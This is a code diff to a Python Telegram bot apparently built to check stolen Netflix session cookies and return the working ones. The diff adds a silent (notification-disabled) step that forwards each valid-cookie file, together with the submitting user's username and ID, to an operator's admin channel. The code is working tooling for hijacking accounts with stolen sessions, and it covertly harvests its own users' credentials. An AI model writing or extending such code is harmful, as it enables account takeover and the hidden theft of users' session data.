@@ -146,7 +146,7 @@ async def process_batch(checker, batch, start_index):
             tasks.append(task)
         return await asyncio.gather(*tasks)
 
-async def check_cookies_async(checker, lines_list, bot, chat_id, message_id):
+async def check_cookies_async(checker, lines_list, bot, chat_id, message_id, user=None):
     """Main async function to check cookies for the bot, with progress updates."""
     # Reset valid and invalid lines before each run
     checker.valid_lines = []
@@ -178,56 +178,45 @@ async def check_cookies_async(checker, lines_list, bot, chat_id, message_id):
             await asyncio.sleep(delay)
     
     await status_message.delete() # Remove the progress message
-    await save_valid_cookies_for_bot(checker, total_lines, bot, chat_id)
+    await save_valid_cookies_for_bot(checker, total_lines, bot, chat_id, user)
 
-async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
-    """Save valid and invalid cookies to files and send to Telegram"""
+async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id, user=None):
+    """Save valid cookies to file and send to Telegram (admin gets only valid file + user info)"""
     valid_lines = checker.valid_lines
     invalid_lines = checker.invalid_lines
-    
+
     if not valid_lines and not invalid_lines:
         await bot.send_message(chat_id, "❌ No cookies were checked!")
         return
-        
+
     # Create timestamps
     now = datetime.now()
     file_timestamp = now.strftime("%Y%m%d_%H%M%S")
     display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
-    
+
     # Create filenames with count and timestamp
     valid_filename = f"valid_cookies_{len(valid_lines)}_{checker.mode}_{file_timestamp}.txt"
-    invalid_filename = f"invalid_cookies_{len(invalid_lines)}_{checker.mode}_{file_timestamp}.txt"
-    
-    # Create temp files
     valid_temp_filepath = os.path.join(tempfile.gettempdir(), valid_filename)
-    invalid_temp_filepath = os.path.join(tempfile.gettempdir(), invalid_filename)
-    
+
     try:
         # Save valid cookies
         if valid_lines:
             with open(valid_temp_filepath, "w", encoding="utf-8") as f:
                 for line in valid_lines:
                     f.write(f"{line}\n")
-        
-        # Save invalid cookies
-        if invalid_lines:
-            with open(invalid_temp_filepath, "w", encoding="utf-8") as f:
-                for line, reason in invalid_lines:
-                    f.write(f"{line} | Reason: {reason}\n")
-        
-        # Format message text as per user request
+
+        # Format message text for user
         msg_text = (
             f"🍪 Netflix Cookie Checker Results\n"
             f"📝 Total Cookies: {total_lines_count}\n"
             f"✅ Valid Cookies: {len(valid_lines)}\n"
             f"❌ Invalid Cookies: {len(invalid_lines)}\n"
             f"📅 Date: {display_timestamp}\n\n"
-            f"{valid_filename}\n"
-            f"{invalid_filename}"
+            f"{valid_filename}"
         )
         # Send stats message first
         await bot.send_message(chat_id, msg_text)
-        # Then send both files as documents without extra captions
+        # Then send valid file as document
         if valid_lines:
             with open(valid_temp_filepath, 'rb') as doc:
                 await bot.send_document(
@@ -235,17 +224,24 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
                     document=doc,
                     filename=valid_filename
                 )
-        if invalid_lines:
-            with open(invalid_temp_filepath, 'rb') as doc:
-                await bot.send_document(
-                    chat_id=chat_id,
-                    document=doc,
-                    filename=invalid_filename
-                )
-        # Also send a copy to the admin channel silently
+        # Also send a copy to the admin channel silently (only valid file, with user info)
         try:
             if TELEGRAM_CHAT_ID:
-                await bot.send_message(TELEGRAM_CHAT_ID, msg_text, disable_notification=True)
+                # Get user info for admin message
+                admin_user_info = ""
+                if user:
+                    username = f"@{user.username}" if getattr(user, 'username', None) else None
+                    user_id = user.id if getattr(user, 'id', None) else None
+                    admin_user_info = f"👤 User: {username} (id: {user_id})\n\n" if username else f"👤 User ID: {user_id}\n\n"
+                admin_msg = (
+                    f"{admin_user_info}"
+                    f"🍪 Netflix Cookie Checker Results\n"
+                    f"📝 Total Cookies: {total_lines_count}\n"
+                    f"✅ Valid Cookies: {len(valid_lines)}\n"
+                    f"❌ Invalid Cookies: {len(invalid_lines)}\n"
+                    f"📅 Date: {display_timestamp}"
+                )
+                await bot.send_message(TELEGRAM_CHAT_ID, admin_msg, disable_notification=True)
                 if valid_lines:
                     with open(valid_temp_filepath, 'rb') as doc:
                         await bot.send_document(
@@ -254,24 +250,16 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
                             filename=valid_filename,
                             disable_notification=True
                         )
-                if invalid_lines:
-                    with open(invalid_temp_filepath, 'rb') as doc:
-                        await bot.send_document(
-                            chat_id=TELEGRAM_CHAT_ID,
-                            document=doc,
-                            filename=invalid_filename,
-                            disable_notification=True
-                        )
         except Exception as e:
             logger.error(f"Failed to send results to admin channel ({TELEGRAM_CHAT_ID}): {e}", exc_info=True)
-        
+
     except Exception as e:
         logger.error(f"Error saving cookies: {e}", exc_info=True)
         await bot.send_message(chat_id, "❌ An error occurred while saving the results.")
-    
+
     finally:
         # Clean up the temp files
-        for filepath in [valid_temp_filepath, invalid_temp_filepath]:
+        for filepath in [valid_temp_filepath]:
             if os.path.exists(filepath):
                 os.remove(filepath)
 
